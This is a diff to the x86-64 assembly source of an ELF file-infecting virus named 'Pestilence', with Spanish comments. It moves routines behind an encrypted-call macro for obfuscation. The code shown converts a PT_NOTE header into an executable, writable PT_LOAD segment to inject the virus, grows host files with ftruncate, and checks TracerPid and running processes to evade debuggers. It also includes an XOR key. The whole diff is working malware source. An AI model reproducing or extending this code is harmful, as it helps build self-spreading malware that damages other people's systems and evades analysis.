@@ -44,7 +44,7 @@ section .text
         ret
     __F_close_proc_dir__end:
 
-    close_status_file:
+    __F_close_status_file:
         push rax
         push rdi
         mov rax, SC_CLOSE
@@ -53,7 +53,56 @@ section .text
         pop rdi
         pop rax
         ret
+    __F_close_status_file__end:
 
+    __F_strlen:
+        ; calculamos longitud del nombre del directorio PID
+
+        ; rdi = puntero al nombre del directorio (string acabada en 0)
+        lea rdi, [r8 + dirent.d_name]
+        mov al, 0
+        mov rcx, -1   ; 0xffffffffffffffff
+        cld
+        repne scasb
+        ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
+        ; hasta encontrar 0, es len + 1. (magia negra asm)
+        not rcx
+        dec rcx
+        ret
+    __F_strlen__end:
+
+    __F_mod_pt_note:
+        lea rax, VAR(Pestilence.note_phdr_ptr)
+        mov rax, [rax]
+        mov [rax], dword 0x01                           ; p_type = PT_LOAD
+        ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
+        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
+        mov ecx, dword VAR(Pestilence.file_final_len)
+        sub ecx, dword VAR(Pestilence.virus_size)
+        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
+        mov VAR(Pestilence.virus_offset), rcx
+        mov rcx, VAR(Pestilence.max_vaddr_end)
+        ALIGN rcx
+        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
+        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
+        mov VAR(Pestilence.new_entry), rcx
+        mov ecx, dword VAR(Pestilence.virus_size)
+        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
+        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
+        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
+        ret
+    __F_mod_pt_note__end:
+
+    __F_ftruncate:
+        ; ftruncate(fd_file, file_final_len)
+        mov rdi, VAR(Pestilence.fd_file)
+        xor rsi, rsi
+        mov esi, dword VAR(Pestilence.file_final_len)
+        mov rax, SC_FTRUNCATE
+        syscall
+        test rax, rax
+        ret
+    __F_ftruncate__end:
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -132,18 +181,19 @@ section .text
 
         ; calculamos longitud del nombre del directorio PID
 
-        ; rdi = puntero al nombre del directorio (string acabada en 0)
-        lea rdi, [r8 + dirent.d_name]
-        mov al, 0
-        mov rcx, -1   ; 0xffffffffffffffff
-        cld
-        repne scasb
-        ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
-        ; hasta encontrar 0, es len + 1. (magia negra asm)
-        not rcx
-        dec rcx
+        ; ; rdi = puntero al nombre del directorio (string acabada en 0)
+        ; lea rdi, [r8 + dirent.d_name]
+        ; mov al, 0
+        ; mov rcx, -1   ; 0xffffffffffffffff
+        ; cld
+        ; repne scasb
+        ; ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
+        ; ; hasta encontrar 0, es len + 1. (magia negra asm)
+        ; not rcx
+        ; dec rcx
 
         ; concatenamos "/proc/" + "d_name"
+        CALL_ENCRYPT(strlen)
 
         lea rdi, [rsp]
         add rdi, 6
@@ -246,7 +296,7 @@ section .text
 
     .cleanup_and_jump_to_host_1:
         add rsp, 0x1000
-        call close_status_file
+        CALL_ENCRYPT(close_status_file)
         jmp .jump_to_host
 
     .check_tracerPid_value:
@@ -255,7 +305,7 @@ section .text
 
     .close_status_file_and_infect:
         add rsp, 0x1000
-        call close_status_file
+        CALL_ENCRYPT(close_status_file)
 
     .start_infection:
         ;load dirs
@@ -472,35 +522,36 @@ section .text
 
     .ftruncate:
         ; ftruncate(fd_file, file_final_len)
-        mov rdi, VAR(Pestilence.fd_file)
-        xor rsi, rsi
-        mov esi, dword VAR(Pestilence.file_final_len)
-        mov rax, SC_FTRUNCATE
-        syscall
-        test rax, rax
+        ; mov rdi, VAR(Pestilence.fd_file)
+        ; xor rsi, rsi
+        ; mov esi, dword VAR(Pestilence.file_final_len)
+        ; mov rax, SC_FTRUNCATE
+        ; syscall
+        ; test rax, rax
+        CALL_ENCRYPT(ftruncate)
         jnz .munmap
 
     .mod_pt_note:
         ; Pestilence.note_phdr_ptr es una dirección de memoria que apunta a un puntero
-        lea rax, VAR(Pestilence.note_phdr_ptr)
-        mov rax, [rax]
-        mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
-        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
-        mov ecx, dword VAR(Pestilence.file_final_len)
-        sub ecx, dword VAR(Pestilence.virus_size)
-        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
-        mov VAR(Pestilence.virus_offset), rcx
-        mov rcx, VAR(Pestilence.max_vaddr_end)
-        ALIGN rcx
-        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
-        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
-        mov VAR(Pestilence.new_entry), rcx
-        mov ecx, dword VAR(Pestilence.virus_size)
-        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
-        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
-        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
-
+        ; lea rax, VAR(Pestilence.note_phdr_ptr)
+        ; mov rax, [rax]
+        ; mov [rax], dword 0x01                           ; p_type = PT_LOAD
+        ; ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
+        ; mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
+        ; mov ecx, dword VAR(Pestilence.file_final_len)
+        ; sub ecx, dword VAR(Pestilence.virus_size)
+        ; mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
+        ; mov VAR(Pestilence.virus_offset), rcx
+        ; mov rcx, VAR(Pestilence.max_vaddr_end)
+        ; ALIGN rcx
+        ; mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
+        ; mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
+        ; mov VAR(Pestilence.new_entry), rcx
+        ; mov ecx, dword VAR(Pestilence.virus_size)
+        ; mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
+        ; mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
+        ; mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
+        CALL_ENCRYPT(mod_pt_note)
     .write_payload:
         lea rsi, _start
         mov rdi, VAR(Pestilence.mmap_ptr)
@@ -576,7 +627,7 @@ section .text
     tracerPid_str   db      "TracerPid:",0x9 ; 11
     status_file     db      "/proc/self/status",0 ; 18
     xor_pass        db      "p3st1l3!" ; 8
-    forbidden_prog  db      0x2F 0x76, "i", 0x6D, 0;"/vim",0  4
+    forbidden_prog  db      0x2F, 0x76, "i", 0x6D, 0;"/vim",0  4
     exe_string      db      "/exe",0 ; 5
     hello           db      "[+] hello",10,0 ;11
     proc            db      "/proc/",0 ; 7
